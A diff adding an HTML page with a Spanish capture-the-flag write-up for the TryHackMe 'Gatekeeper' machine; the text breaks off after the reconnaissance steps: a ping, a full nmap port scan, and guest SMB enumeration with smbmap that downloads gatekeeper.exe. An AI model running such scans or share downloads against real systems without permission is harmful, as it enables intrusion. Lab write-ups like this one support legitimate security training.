@@ -1,0 +1,943 @@
+<!DOCTYPE html>
+<html lang="es" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='Resolución de la Máquina Gatekeeper de TryHackMe.'>
+<title>Write Up Gatekeeper</title>
+
+<link rel='canonical' href='https://sx1v4n.github.io/p/gatekeeper-thm/'>
+
+<link rel="stylesheet" href="/scss/style.min.8191399262444ab68b72a18c97392f5349be20a1615d77445be51e974c144cff.css"><meta property='og:title' content='Write Up Gatekeeper'>
+<meta property='og:description' content='Resolución de la Máquina Gatekeeper de TryHackMe.'>
+<meta property='og:url' content='https://sx1v4n.github.io/p/gatekeeper-thm/'>
+<meta property='og:site_name' content='S.x1v4n'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2023-07-12T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-07-12T00:00:00&#43;00:00'/><meta property='og:image' content='https://sx1v4n.github.io/p/gatekeeper-thm/logo.jpg' />
+<meta name="twitter:title" content="Write Up Gatekeeper">
+<meta name="twitter:description" content="Resolución de la Máquina Gatekeeper de TryHackMe."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://sx1v4n.github.io/p/gatekeeper-thm/logo.jpg' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "dark");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/logo_hude82ea7f464a850aa72eb63e992f12f3_89784_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">S.x1v4n</a></h1>
+            <h2 class="site-description">Jr Penetration Tester / eJPTv2</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Sx1v4n'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <?xml version="1.0"?><svg fill="#FFFFFF" xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 50 50" width="50px" height="50px">    <path d="M17.791,46.836C18.502,46.53,19,45.823,19,45v-5.4c0-0.197,0.016-0.402,0.041-0.61C19.027,38.994,19.014,38.997,19,39 c0,0-3,0-3.6,0c-1.5,0-2.8-0.6-3.4-1.8c-0.7-1.3-1-3.5-2.8-4.7C8.9,32.3,9.1,32,9.7,32c0.6,0.1,1.9,0.9,2.7,2c0.9,1.1,1.8,2,3.4,2 c2.487,0,3.82-0.125,4.622-0.555C21.356,34.056,22.649,33,24,33v-0.025c-5.668-0.182-9.289-2.066-10.975-4.975 c-3.665,0.042-6.856,0.405-8.677,0.707c-0.058-0.327-0.108-0.656-0.151-0.987c1.797-0.296,4.843-0.647,8.345-0.714 c-0.112-0.276-0.209-0.559-0.291-0.849c-3.511-0.178-6.541-0.039-8.187,0.097c-0.02-0.332-0.047-0.663-0.051-0.999 c1.649-0.135,4.597-0.27,8.018-0.111c-0.079-0.5-0.13-1.011-0.13-1.543c0-1.7,0.6-3.5,1.7-5c-0.5-1.7-1.2-5.3,0.2-6.6 c2.7,0,4.6,1.3,5.5,2.1C21,13.4,22.9,13,25,13s4,0.4,5.6,1.1c0.9-0.8,2.8-2.1,5.5-2.1c1.5,1.4,0.7,5,0.2,6.6c1.1,1.5,1.7,3.2,1.6,5 c0,0.484-0.045,0.951-0.11,1.409c3.499-0.172,6.527-0.034,8.204,0.102c-0.002,0.337-0.033,0.666-0.051,0.999 c-1.671-0.138-4.775-0.28-8.359-0.089c-0.089,0.336-0.197,0.663-0.325,0.98c3.546,0.046,6.665,0.389,8.548,0.689 c-0.043,0.332-0.093,0.661-0.151,0.987c-1.912-0.306-5.171-0.664-8.879-0.682C35.112,30.873,31.557,32.75,26,32.969V33 c2.6,0,5,3.9,5,6.6V45c0,0.823,0.498,1.53,1.209,1.836C41.37,43.804,48,35.164,48,25C48,12.318,37.683,2,25,2S2,12.318,2,25 C2,35.164,8.63,43.804,17.791,46.836z"/></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/ivan-romero-capita-a56838256/'
+                        target="_blank"
+                        title="Linkedin"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg"  viewBox="0 0 48 48" width="48px" height="48px"><path fill="#0288D1" d="M42,37c0,2.762-2.238,5-5,5H11c-2.761,0-5-2.238-5-5V11c0-2.762,2.239-5,5-5h26c2.762,0,5,2.238,5,5V37z"/><path fill="#FFF" d="M12 19H17V36H12zM14.485 17h-.028C12.965 17 12 15.888 12 14.499 12 13.08 12.995 12 14.514 12c1.521 0 2.458 1.08 2.486 2.499C17 15.887 16.035 17 14.485 17zM36 36h-5v-9.099c0-2.198-1.225-3.698-3.192-3.698-1.501 0-2.313 1.012-2.707 1.99C24.957 25.543 25 26.511 25 27v9h-5V19h5v2.616C25.721 20.5 26.85 19 29.738 19c3.578 0 6.261 2.25 6.261 7.274L36 36 36 36z"/></svg>
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Inicio</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/resources/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-book-2" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M19 4v16h-12a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12z" />
+  <path d="M19 16h-12a2 2 0 0 0 -2 2" />
+  <path d="M9 8h6" />
+</svg>
+
+
+
+                
+                <span>Resources</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/writeups/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewBox="0 0 512 512"><path d="M336 64h32a48 48 0 0148 48v320a48 48 0 01-48 48H144a48 48 0 01-48-48V112a48 48 0 0148-48h32" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="32"/><rect x="176" y="32" width="160" height="64" rx="26.13" ry="26.13" fill="none" stroke="currentColor" stroke-linejoin="round" stroke-width="32"/></svg>
+                
+                <span>WriteUps</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/whoami/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="ionicon" viewBox="0 0 512 512"><path d="M344 144c-3.92 52.87-44 96-88 96s-84.15-43.12-88-96c-4-55 35-96 88-96s92 42 88 96z" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="32"/><path d="M256 304c-87 0-175.3 48-191.64 138.6C62.39 453.52 68.57 464 80 464h352c11.44 0 17.62-10.48 15.65-21.4C431.3 352 343 304 256 304z" fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="32"/></svg>
+                
+                <span>Whoami</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archivos/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archivo</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#buffer-overflow">Buffer Overflow</a></li>
+    <li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/gatekeeper-thm/">
+                <img src="/p/gatekeeper-thm/logo.jpg"
+                        
+                        width="1000" 
+                        height="667" 
+                        loading="lazy"
+                        alt="Featured image of post Write Up Gatekeeper" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/try-hack-me/" style="background-color: #f75151; color: #fff;">
+                TryHackMe
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/gatekeeper-thm/">Write Up Gatekeeper</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Resolución de la Máquina Gatekeeper de TryHackMe.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jul 12, 2023</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Comprobamos que la máquina esté activa.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">ping</span> <span class="o">-</span><span class="nx">c1</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>             
+</span></span><span class="line"><span class="cl"><span class="nx">PING</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span><span class="p">)</span> <span class="mi">56</span><span class="p">(</span><span class="mi">84</span><span class="p">)</span> <span class="nx">bytes</span> <span class="nx">of</span> <span class="nx">data</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="mi">64</span> <span class="nx">bytes</span> <span class="nx">from</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span><span class="o">:</span> <span class="nx">icmp_seq</span><span class="o">=</span><span class="mi">1</span> <span class="nx">ttl</span><span class="o">=</span><span class="mi">127</span> <span class="nx">time</span><span class="o">=</span><span class="mf">45.4</span> <span class="nx">ms</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">---</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span> <span class="nx">ping</span> <span class="nx">statistics</span> <span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="mi">1</span> <span class="nx">packets</span> <span class="nx">transmitted</span><span class="p">,</span> <span class="mi">1</span> <span class="nx">received</span><span class="p">,</span> <span class="mi">0</span><span class="o">%</span> <span class="nx">packet</span> <span class="nx">loss</span><span class="p">,</span> <span class="nx">time</span> <span class="mi">0</span><span class="nx">ms</span>
+</span></span><span class="line"><span class="cl"><span class="nx">rtt</span> <span class="nx">min</span><span class="o">/</span><span class="nx">avg</span><span class="o">/</span><span class="nx">max</span><span class="o">/</span><span class="nx">mdev</span> <span class="o">=</span> <span class="mf">45.424</span><span class="o">/</span><span class="mf">45.424</span><span class="o">/</span><span class="mf">45.424</span><span class="o">/</span><span class="mf">0.000</span> <span class="nx">ms</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Relizamos un escaneo de nmap para ver lor servicios y puertos expuestos de la máquina, en este caso debemos fijarnos en el puerto 445.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">sudo</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sS</span> <span class="o">--</span><span class="nx">min</span><span class="o">-</span><span class="nx">rate</span> <span class="mi">5000</span> <span class="o">-</span><span class="nx">n</span> <span class="o">-</span><span class="nx">v</span> <span class="o">-</span><span class="nx">p</span><span class="o">-</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span> 
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="nx">sudo</span><span class="p">]</span> <span class="nx">contraseña</span> <span class="nx">para</span> <span class="nx">shadoow</span><span class="o">:</span> 
+</span></span><span class="line"><span class="cl"><span class="nx">Starting</span> <span class="nx">Nmap</span> <span class="mf">7.93</span> <span class="p">(</span> <span class="nx">https</span><span class="o">://</span><span class="nx">nmap</span><span class="o">.</span><span class="nx">org</span> <span class="p">)</span> <span class="nx">at</span> <span class="mi">2023</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">12</span> <span class="mi">12</span><span class="o">:</span><span class="mi">10</span> <span class="nx">CEST</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Initiating</span> <span class="nx">Ping</span> <span class="nx">Scan</span> <span class="nx">at</span> <span class="mi">12</span><span class="o">:</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Scanning</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span> <span class="p">[</span><span class="mi">4</span> <span class="nx">ports</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Completed</span> <span class="nx">Ping</span> <span class="nx">Scan</span> <span class="nx">at</span> <span class="mi">12</span><span class="o">:</span><span class="mi">10</span><span class="p">,</span> <span class="mf">0.07</span><span class="nx">s</span> <span class="nx">elapsed</span> <span class="p">(</span><span class="mi">1</span> <span class="nx">total</span> <span class="nx">hosts</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Initiating</span> <span class="nx">SYN</span> <span class="nx">Stealth</span> <span class="nx">Scan</span> <span class="nx">at</span> <span class="mi">12</span><span class="o">:</span><span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Scanning</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span> <span class="p">[</span><span class="mi">65535</span> <span class="nx">ports</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">49153</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">49154</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">49161</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">49167</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">31337</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">49155</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Discovered</span> <span class="nx">open</span> <span class="nx">port</span> <span class="mi">49152</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">on</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Completed</span> <span class="nx">SYN</span> <span class="nx">Stealth</span> <span class="nx">Scan</span> <span class="nx">at</span> <span class="mi">12</span><span class="o">:</span><span class="mi">10</span><span class="p">,</span> <span class="mf">13.95</span><span class="nx">s</span> <span class="nx">elapsed</span> <span class="p">(</span><span class="mi">65535</span> <span class="nx">total</span> <span class="nx">ports</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Nmap</span> <span class="nx">scan</span> <span class="nx">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Host</span> <span class="nx">is</span> <span class="nx">up</span> <span class="p">(</span><span class="mf">0.043</span><span class="nx">s</span> <span class="nx">latency</span><span class="p">)</span><span class="o">.</span>
+</span></span><span class="line"><span class="cl"><span class="k">Not</span> <span class="nx">shown</span><span class="o">:</span> <span class="mi">65524</span> <span class="nx">closed</span> <span class="nx">tcp</span> <span class="nx">ports</span> <span class="p">(</span><span class="nx">reset</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PORT</span>      <span class="nx">STATE</span> <span class="nx">SERVICE</span>
+</span></span><span class="line"><span class="cl"><span class="mi">135</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">msrpc</span>
+</span></span><span class="line"><span class="cl"><span class="mi">139</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">netbios</span><span class="o">-</span><span class="nx">ssn</span>
+</span></span><span class="line"><span class="cl"><span class="mi">445</span><span class="o">/</span><span class="nx">tcp</span>   <span class="nx">open</span>  <span class="nx">microsoft</span><span class="o">-</span><span class="nx">ds</span>
+</span></span><span class="line"><span class="cl"><span class="mi">3389</span><span class="o">/</span><span class="nx">tcp</span>  <span class="nx">open</span>  <span class="nx">ms</span><span class="o">-</span><span class="nx">wbt</span><span class="o">-</span><span class="nx">server</span>
+</span></span><span class="line"><span class="cl"><span class="mi">31337</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">Elite</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49152</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49153</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49154</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49155</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49161</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>
+</span></span><span class="line"><span class="cl"><span class="mi">49167</span><span class="o">/</span><span class="nx">tcp</span> <span class="nx">open</span>  <span class="nx">unknown</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Con SMBMap podemos descargarnos un ejecutable.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">smbmap</span> <span class="o">-</span><span class="nx">H</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">guest</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">Users</span><span class="o">/</span><span class="nx">Share</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">IP</span><span class="o">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span><span class="o">:</span><span class="mi">445</span>        <span class="nx">Name</span><span class="o">:</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span>                                      
+</span></span><span class="line"><span class="cl">        <span class="nx">Disk</span>                                                    <span class="nx">Permissions</span>     <span class="nx">Comment</span>
+</span></span><span class="line"><span class="cl">        <span class="o">----</span>                                                    <span class="o">-----------</span>     <span class="o">-------</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">Users</span>                                                   <span class="nx">READ</span> <span class="nx">ONLY</span>
+</span></span><span class="line"><span class="cl">        <span class="o">.</span><span class="nx">\UsersShare\</span><span class="o">*</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">dr</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>                <span class="mi">0</span> <span class="nx">Fri</span> <span class="nx">May</span> <span class="mi">15</span> <span class="mo">03</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mo">07</span> <span class="mi">2020</span>    <span class="o">.</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">dr</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>                <span class="mi">0</span> <span class="nx">Fri</span> <span class="nx">May</span> <span class="mi">15</span> <span class="mo">03</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mo">07</span> <span class="mi">2020</span>    <span class="o">..</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">fr</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span><span class="nx">r</span><span class="o">--</span>            <span class="mi">13312</span> <span class="nx">Fri</span> <span class="nx">May</span> <span class="mi">15</span> <span class="mo">03</span><span class="o">:</span><span class="mi">58</span><span class="o">:</span><span class="mo">07</span> <span class="mi">2020</span>    <span class="nx">gatekeeper</span><span class="o">.</span><span class="nx">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">~</span> <span class="nx">❯</span> <span class="nx">smbmap</span> <span class="o">-</span><span class="nx">H</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">20.222</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">guest</span> <span class="o">--</span><span class="nx">download</span> <span class="nx">Users</span><span class="o">/</span><span class="nx">Share</span><span class="o">/</span><span class="nx">gatekeeper</span><span class="o">.</span><span class="nx">exe</span>
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="nx">Starting</span> <span class="nx">download</span><span class="o">:</span> <span class="nx">Users\Share\gatekeeper</span><span class="o">.</span><span class="nx">exe</span> <span class="p">(</span><span class="mi">13312</span> <span class="nx">bytes</span><span class="p">)</span>
